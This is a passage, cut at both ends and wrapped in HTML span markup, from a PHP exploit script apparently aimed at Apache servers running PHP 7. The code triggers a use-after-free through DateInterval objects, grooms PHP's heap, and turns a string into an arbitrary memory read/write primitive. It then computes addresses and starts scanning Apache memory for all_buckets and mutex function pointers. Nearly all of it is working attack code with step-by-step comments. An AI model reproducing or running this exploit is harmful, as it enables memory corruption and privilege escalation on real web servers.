class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# contiguous: this can be a problem for a lot of reasons.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# To avoid this, we instanciate several DateInterval objects. These</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# objects will fill a lot of potentially non-contiguous memory blocks,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# ensuring we get &quot;fresh memory&quot; in upcoming allocations.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$contiguous = [];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for($i=0;$i&lt;10;$i++)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$contiguous[] = new DateInterval(&#39;PT1S&#39;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Create some space for our UAF blocks not to get overwritten</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# I: A PHP object is a combination of a lot of structures, such as</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# zval, zend_object, zend_object_handlers, zend_string, etc., which are</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# all allocated, and freed when the object is destroyed.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# After the UAF is triggered on the object, all the structures that are</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# used to represent it will be marked as free.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# If we create other variables afterwards, those variables might be</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# allocated in the object&#39;s previous memory regions, which might pose</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# problems for the rest of the exploitation.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# To avoid this, we allocate a lot of objects before the UAF, and free</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# them afterwards. Since PHP&#39;s heap is LIFO, when we create other vars,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# they will take the place of those objects instead of the object we</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# are triggering the UAF on. This means our object is &quot;shielded&quot; and</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# we don&#39;t have to worry about breaking it.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$room = [];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for($i=0;$i&lt;10;$i++)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$room[] = new Z();</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Build string meant to fill old DateInterval&#39;s timelib_rel_time</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# I: ptr2str&#39;s name is unintuitive here: we just want to allocate a</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# zend_string of size 78.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_protector = ptr2str(0, 78);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39; &nbsp;Allocating $abc and $p&#39;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Create ABC</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# I: This is the variable we will use to R/W memory afterwards.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# After we free the Z object, we&#39;ll make sure abc is overwritten by a</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# timelib_rel_time structure under our control. The first 8*8 = 64 bytes</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# of this structure can be modified easily, meaning we can change the</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# size of abc. This will allow us to read/write memory after abc.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;abc = ptr2str(0, 79);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Create $p meant to protect $this&#39;s blocks</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# I: Right after we trigger the UAF, we will unset $p.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# This means that the timelib_rel_time structure (TRT) of this object</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# will be freed. We will then allocate a string ($protector) of the same</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# size as TRT. Since PHP&#39;s heap is LIFO, the string will take the place</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# of the now-freed TRT in memory.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Then, we create a new DateInterval object ($x). From the same</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# assumption, every structure constituting this new object will take the</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# place of the previous structure. Nevertheless, since TRT&#39;s memory</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# block has already been replaced by $protector, the new TRT will be put</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# in the next free blocks of the same size, which happens to be $abc</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# (remember, |abc| == |timelib_rel_time|).</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# We now have the following situation: $x is a DateInterval object whose</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# internal TRT structure has the same address as $abc&#39;s zend_string.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$p = new DateInterval(&#39;PT1S&#39;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Trigger UAF</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39; &nbsp;Unsetting both variables and setting $protector&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# UAF here, $this is usable despite being freed</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unset($y[0]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Protect $this&#39;s freed blocks</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unset($p);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Protect $p&#39;s timelib_rel_time structure</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$protector = &quot;.$_protector&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# !!! This is only required for apache</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Got no idea as to why there is an extra deallocation (?)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(version_compare(PHP_VERSION, &#39;7.2&#39;) &gt;= 0)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$room[] = &quot;!$_protector&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39; &nbsp;Creating DateInterval object&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# After this line:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# &amp;((php_interval_obj) x).timelib_rel_time == ((zval) abc).value.str</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# We can control the structure of $this-&gt;abc and therefore read/write</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# anything that comes after it in memory by changing its size and</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# making in-place edits using $this-&gt;abc[$position] = $char</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$x = new DateInterval(&#39;PT1S&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# zend_string.refcount = 0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# It will get incremented at some point, and if it is &gt; 1,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# zend_assign_to_string_offset() will try to duplicate it before making</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# the in-place replacement</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$x-&gt;y = 0x00;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# zend_string.len</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$x-&gt;d = 0x100;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# zend_string.val[0-4]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$x-&gt;h = 0x13121110;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Verify UAF was successful</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# We modified stuff via $x; they should be visible by $this-&gt;abc, since</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# they are at the same memory location.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strlen($this-&gt;abc) === $x-&gt;d &amp;&amp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;abc[0] == &quot;\x10&quot; &amp;&amp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;abc[1] == &quot;\x11&quot; &amp;&amp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;abc[2] == &quot;\x12&quot; &amp;&amp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;abc[3] == &quot;\x13&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39;UAF failed, exiting.&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39;UAF successful.&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39;&#39;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Give us some room</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# I: As indicated before, just unset a lot of stuff so that next allocs</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# don&#39;t break our fragile UAFd structure.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unset($room);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Setup the R/W primitive</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# We control $abc&#39;s internal zend_string structure, therefore we can R/W</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# the shared memory block (SHM), but for that we need to know the</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# position of $abc in memory</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# I: We know the absolute position of the SHM, so we need to need abc&#39;s</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# as well, otherwise we cannot compute the offset</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Assuming the allocation was contiguous, memory looks like this, with</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# 0x70-sized fastbins:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# &nbsp;&nbsp;[zend_string:abc]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# &nbsp;&nbsp;[zend_string:protector]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# &nbsp;&nbsp;[FREE#1]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# &nbsp;&nbsp;[FREE#2]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Therefore, the address of the 2nd free block is in the first 8 bytes</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# of the first block: 0x70 * 2 - 24</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$address = str2ptr($this-&gt;abc, 0x70 * 2 - 24);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# The address we got points to FREE#2, hence we&#39;re |block| * 3 higher in</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# memory</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$address = $address - 0x70 * 3;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# The beginning of the string is 24 bytes after its origin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$address = $address + 24;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39;Address of $abc: 0x&#39; . dechex($address));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39;&#39;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Compute the size required for our string to include the whole SHM and</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# apache&#39;s memory region</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$distance = </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;max($addresses[&#39;apache&#39;][1], $addresses[&#39;shm&#39;][1]) -</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$address</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$x-&gt;d = $distance;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# We can now read/write in the whole SHM and apache&#39;s memory region.</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Find all_buckets in memory</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# We are looking for a structure s.t.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# |all_buckets, mutex| = 0x10</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# |mutex, meth| = 0x8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# all_buckets is in apache&#39;s memory region</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# mutex is in apache&#39;s memory region</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# meth is in libaprR&#39;s memory region</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# meth&#39;s function pointers are in libaprX&#39;s memory region</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39;Looking for all_buckets in memory&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$all_buckets = 0;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$i = $addresses[&#39;apache&#39;][0] + 0x10;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$i &lt; $addresses[&#39;apache&#39;][1] - 0x08;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$i += 8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# mutex</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$mutex = $pointer = str2ptr($this-&gt;abc, $i - $address);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!in($pointer, $addresses[&#39;apache&#39;]))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue;</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# meth</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$meth = $pointer = str2ptr($this-&gt;abc, $pointer + 0x8 - $address);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 